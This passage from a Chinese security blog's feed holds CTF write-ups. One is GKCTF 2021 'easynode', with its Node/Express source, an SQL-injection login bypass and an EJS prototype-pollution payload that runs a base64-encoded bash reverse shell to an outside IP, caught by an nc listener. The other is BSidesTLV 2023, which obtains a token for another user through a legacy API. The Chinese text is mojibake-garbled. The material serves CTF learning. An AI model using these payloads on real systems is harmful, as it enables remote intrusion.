<h6 id="3-ä¿®æ”¹å­—ä½“é¢œè‰²"><a href="#3-ä¿®æ”¹å­—ä½“é¢œè‰²" class="headerlink" title="3.ä¿®æ”¹å­—ä½“é¢œè‰²"></a>3.ä¿®æ”¹å­—ä½“é¢œè‰²</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=é¢œè‰²ä»£ç  size=å­—å· face=&quot;å­—ä½“åç§°&quot;&gt;æ–‡æœ¬&lt;/font&gt;</span><br></pre></td></tr></table></figure>

<p>çº¢è‰²çš„ä»£ç æ˜¯#ff0000</p>
<h6 id="4-æ’å…¥å›¾ç‰‡çš„è¯­æ³•æ˜¯"><a href="#4-æ’å…¥å›¾ç‰‡çš„è¯­æ³•æ˜¯" class="headerlink" title="4.æ’å…¥å›¾ç‰‡çš„è¯­æ³•æ˜¯"></a>4.æ’å…¥å›¾ç‰‡çš„è¯­æ³•æ˜¯</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](è¿™é‡Œæ˜¯å›¾ç‰‡æ‰€åœ¨çš„æ–‡ä»¶)</span><br></pre></td></tr></table></figure>

<h6 id="5-è®¾ç½®é“¾æ¥æ˜¯ç›´æ¥å°†é“¾æ¥å†™å…¥"><a href="#5-è®¾ç½®é“¾æ¥æ˜¯ç›´æ¥å°†é“¾æ¥å†™å…¥" class="headerlink" title="5.è®¾ç½®é“¾æ¥æ˜¯ç›´æ¥å°†é“¾æ¥å†™å…¥"></a>5.è®¾ç½®é“¾æ¥æ˜¯ç›´æ¥å°†é“¾æ¥å†™å…¥</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>

<h6 id="6-å¸¸ç”¨å¿«æ·é”®"><a href="#6-å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="6.å¸¸ç”¨å¿«æ·é”®"></a>6.å¸¸ç”¨å¿«æ·é”®</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
]]></content>
  </entry>
  <entry>
    <title>easynode(GKCTF 2021)</title>
    <url>/2023/06/23/%5BGKCTF%202021%5Deasynode/</url>
    <content><![CDATA[<p>nodeåŸå‹é“¾æ±¡æŸ“</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<p>ç»™äº†æºç ï¼Œçœ‹çœ‹æºç ï¼Œæœ€é‡è¦çš„æ˜¯index.js</p>
<p>ç›´æ¥çœ‹index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> format = <span class="built_in">require</span>(<span class="string">&#x27;string-format&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; select,close &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./tools&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&quot;js-extend&quot;</span>).<span class="property">extend</span></span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;generateToken,verifyToken&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;./encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>((__dirname+<span class="string">&#x27;/public/&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">safeQuery</span> =  <span class="keyword">async</span> (<span class="params">username,password</span>)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">waf</span> = (<span class="params">str</span>)=&gt;&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">safeStr</span> = (<span class="params">str</span>)=&gt;&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.<span class="title function_">slice</span>(i + <span class="number">1</span>, str.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = <span class="title function_">safeStr</span>(username);</span><br><span class="line">    password = <span class="title function_">safeStr</span>(password);</span><br><span class="line">    <span class="keyword">let</span> sql = <span class="title function_">format</span>(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>),password.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    <span class="comment">// console.log(sql);</span></span><br><span class="line">    result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/index.html&quot;</span>)</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(html)</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="title function_">safeQuery</span>(username,password).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">result</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">const</span> token = <span class="title function_">generateToken</span>(username)</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;token&quot;</span>:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">json</span>(</span><br><span class="line">                    &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;username or password wrong&quot;</span>&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span>=&gt;</span>&#123;res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;something wrong!&quot;</span>&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/admin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">`select board from board where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>())));  </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;board,username&#125;)</span><br><span class="line">        res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(html)</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;stop!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/addAdmin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/adminDIV&quot;</span>,<span class="title function_">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()))); </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">extend</span>(board,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>

<p>ä¸€æ­¥ä¸€æ­¥çœ‹ä»£ç </p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623200720308.png" alt="image-20230623200720308"></p>
<p>è¿™é‡Œæ˜¯å°†usernameå’Œpasswordè¿›è¡Œä¸€ä¸ªéªŒè¯ï¼Œå¦‚æœæœ‰<code>*blacklist* = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>é»‘åå•é‡Œçš„å­—ç¬¦å°±ä¼šå°†å­—ç¬¦æ›¿æ¢æˆ<code>*</code>å·</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202457538.png" alt="image-20230623202457538"></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ‹¼æ¥æ“ä½œï¼Œåé¢è¿™é‡Œæœ‰ç”¨ï¼Œä¼šè®²åˆ°</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202538937.png" alt="image-20230623202538937"></p>
<p>æ ¹ç›®å½•è·¯ç”±ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œå°±æ˜¯è¿”å›ä¸€ä¸ªä¸»é¡µ</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623202834889.png" alt="image-20230623202834889"></p>
<p>&#x2F;loginè·¯ç”±ï¼Œåˆ¤æ–­usernameå’Œpassordæ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œç”¨çš„å°±æ˜¯<code>safeQuery</code>è‡ªå®šä¹‰å‡½æ•°ï¼Œå¦‚æœæ­£ç¡®å°±ä¼šè¿”å›ä¸€ä¸ªtokenï¼Œä¸æ­£ç¡®å°±è¿”å›ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203247062.png" alt="image-20230623203247062"></p>
<p>&#x2F;adminè·¯ç”±ï¼Œå…ˆæ£€éªŒtokenï¼Œéœ€è¦ç™»å½•æˆåŠŸåæ‰èƒ½è®¿é—®ï¼Œç„¶åæ¨¡æ¿æ¸²æŸ“ejsï¼Œä¸€èˆ¬ä¼šæœ‰åŸå‹é“¾æ±¡æŸ“</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203433315.png" alt="image-20230623203433315"></p>
<p>&#x2F;addAdminè·¯ç”±ï¼Œçœ‹åå­—å°±çŸ¥é“èƒ½æ·»åŠ ç”¨æˆ·ï¼Œä½†ä¹Ÿæ˜¯éœ€è¦å…ˆç™»å½•æ‰èƒ½ä½¿ç”¨è¿™ä¸ªè·¯ç”±ï¼Œç„¶åè¾“å…¥usernameå’Œpasswordåå°±ä¼šå°†ä¿¡æ¯æ’å…¥åˆ°æ•°æ®åº“ä¸­</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203626318.png" alt="image-20230623203626318"></p>
<p>&#x2F;adminDIVè·¯ç”±ï¼Œæœ€åä¸€ä¸ªè·¯ç”±ï¼Œçœ‹åˆ°ä¹Ÿæ˜¯è¿›è¡Œäº†ä¸€ä¸ªtokenæ£€éªŒï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªextend</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203732989.png" alt="image-20230623203732989"></p>
<p>è¿™é‡Œå¦‚æœå°†usernameå’Œdataçš„é”®å€¼è¿›è¡Œäº†æ‹¼æ¥ï¼Œè¿”å›äº†ä¸€ä¸ªjsonæ•°æ®ï¼Œç„¶åè¿›è¡Œextendï¼Œç„¶åä¸€ä¸ªboard</p>
<p>æˆ‘ä»¬åœ¨&#x2F;adminè·¯ç”±çœ‹åˆ°æœ‰</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623203911427.png" alt="image-20230623203911427"></p>
<p>è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªboardï¼Œå¦‚æœå¯ä»¥åˆ©ç”¨&#x2F;adminDIVè·¯ç”±ï¼Œè®©usernameç­‰äº<code>__proto__</code>ï¼Œdataæ˜¯åå¼¹shellå‘½ä»¤ï¼Œç„¶åç»è¿‡&#x2F;adminè·¯ç”±è¿›è¡Œæ¨¡æ¿æ¸²æŸ“æ˜¯ä¸æ˜¯å°±èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”usernameä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¯ä»¥é€šè¿‡&#x2F;addAdminè·¯ç”±æ¥æ”¹å˜username</p>
<p>æ—¢ç„¶æœ‰æ€è·¯äº†ï¼Œé‚£ä¹ˆå°±éœ€è¦å…ˆç™»å½•</p>
<p>è¿”å›åˆ°ç™»å½•è·¯ç”±æ¥ï¼Œé€šè¿‡sqlè¯­å¥å°±èƒ½ç™»å½•æˆåŠŸ</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623204436847.png" alt="image-20230623204436847"></p>
<p>å¯ä»¥è®©usernameç­‰äº<code>admin&#39;#</code>ï¼Œpassowordéšä¾¿ä¸€ä¸ªå€¼éƒ½å¯ä»¥ï¼Œè¿™æ ·sqlè¯­å¥å°±å˜æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where username = &#x27;admin&#x27;#&#x27; and password = &#x27;111&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±èƒ½æˆåŠŸç™»å½•ï¼Œç»•è¿‡é»‘åå•å¯ä»¥ä½¿ç”¨æ•°ç»„ï¼Œæ ¹æ®jsçš„é¢˜å‹ï¼Œå°†æ•°ç»„ä¸æ•°ç»„è¿›è¡Œæ‹¼æ¥åï¼Œæ•°ç»„å°±ä¼šå˜æˆå­—ç¬¦ä¸²</p>
<p>å› ä¸ºåªæœ‰åŒ¹é…åˆ°é»‘åå•åæ‰ä¼šè¿›è¡Œæ‹¼æ¥ï¼Œæ‰€ä»¥éœ€è¦è®©ä»–åŒ¹é…åˆ°</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[]=admin&#x27;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=111</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623212736026.png" alt="image-20230623212736026"></p>
<p>æˆåŠŸå¾—åˆ°äº†tokenï¼Œæ¥ä¸‹æ¥å°±æŒ‰ç…§æ€è·¯æ¥å°±è¡Œ</p>
<p>å…ˆæ˜¯åˆ›é€ ä¸€ä¸ªç”¨æˆ·åæ˜¯<code>__proto__</code>çš„ç”¨æˆ·ï¼Œå¯†ç éšæ„</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213154037.png" alt="image-20230623213154037"></p>
<p>è¿”å›<code>add admin successful!</code>å³å¯ï¼Œç„¶åç™»å½•è¿™ä¸ªç”¨æˆ·ï¼Œä¼šè¿”å›è¿™ä¸ªç”¨æˆ·çš„tokenï¼Œåé¢éƒ½æ˜¯ä½¿ç”¨çš„è¿™ä¸ªtoken</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213341087.png" alt="image-20230623213341087"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨adminDIVè·¯ç”±è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo%20YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjE0My4xNTUuOTAvMTExMSAwPiYx%3D%7Cbase64%20-d%7Cbash&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214121129.png" alt="image-20230623214121129"></p>
<p>æœ€ååˆ©ç”¨adminè·¯ç”±è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œç›´æ¥è®¿é—®&#x2F;adminè·¯ç”±å³å¯</p>
<p>æ³¨æ„è¦ä½¿ç”¨æœåŠ¡å™¨è¿›è¡Œncç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png" alt="image-20230623214302527"></p>
]]></content>
  </entry>
  <entry>
    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
    <content><![CDATA[<p>My Vouchers Repo</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<p>æ‰“å¼€é¡µé¢å°±æ˜¯ä¸€ä¸ªç™»å½•å’Œæ³¨å†Œç•Œé¢</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
<p>é‚£å°±å…ˆæ³¨å†Œä¸€ä¸ªï¼Œä¸€ä¸ªæ˜¯homeç•Œé¢ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ä¼˜æƒ å·ç•Œé¢</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
<p>æ ¹æ®é¢˜ç›®ç»™ä½ ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯è¦ç™»å½•ç”¨æˆ·åä¸º<code>john</code>çš„ç”¨æˆ·ï¼Œç„¶ååœ¨æºä»£ç å¤„çš„<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>ä¸­çœ‹åˆ°</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
<p>è¿™æ ·çŸ¥é“äº†æ˜¯åœ¨headerå¤´<code>Authorization</code>å¤„æœ‰ç”¨æˆ·ç™»å½•ä¿¡æ¯ï¼Œç„¶åå°±æ˜¯æƒ³åŠæ³•ä¼ªé€ ä¸€ä¸ªç”¨æˆ·åæ˜¯<code>john</code>çš„ç”¨æˆ·ï¼Œè¿™ä¸ªæ˜¯jwtï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å¯†é’¥ï¼Œè¿˜åœ¨æºä»£ç ä¸­æ‰¾åˆ°ä¸€ä¸ªapiæ¥å£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>

<p>æ‰«æç›®å½•å‘ç°è¿˜æœ‰ä¸€ä¸ª<code>api/v1</code>æ¥å£ï¼Œä½†æ˜¯æ˜¾ç¤º<code>not found</code>ï¼Œæ¥ä¸‹æ¥å°±ä¸ä¼šåšäº†ï¼Œç„¶åå°±çœ‹åˆ«äººç»™çš„hintï¼Œå‘ç°api&#x2F;v1æ˜¯å¯ä»¥æ‰“å¼€çš„</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
<p>è¿™ä¸ªæœ‰ä¸€ä¸ª<code>/refresh_token</code>ï¼Œæ‰€ä»¥åœ¨urlä¸ºä¸€ä¸‹ç•Œé¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨jsonä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¯ä»¥å›æ˜¾ä¸€ä¸ªç”¨æˆ·åä¸ºjohnçš„tokenï¼Œç„¶ååœ¨url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>

<p>headerå¤´ä¸­çš„<code>Authorization</code>ä¸­è¾“å…¥<code>Bearer ç”¨æˆ·åä¸ºjohnçš„token</code>å°±å¯ä»¥å¾—åˆ°flag</p>
]]></content>
  </entry>
  <entry>
    <title>dockerå‘½ä»¤</title>
    <url>/2023/03/21/docker/</url>
    <content><![CDATA[<p>dockerå‘½ä»¤</p>
<span id="more"></span>

<h3 id="å®¹å™¨ä½¿ç”¨"><a href="#å®¹å™¨ä½¿ç”¨" class="headerlink" title="å®¹å™¨ä½¿ç”¨"></a>å®¹å™¨ä½¿ç”¨</h3><p>ä½¿ç”¨ docker runè¿è¡Œå®¹å™¨å®ç°â€å¯¹è¯â€çš„åŠŸèƒ½</p>
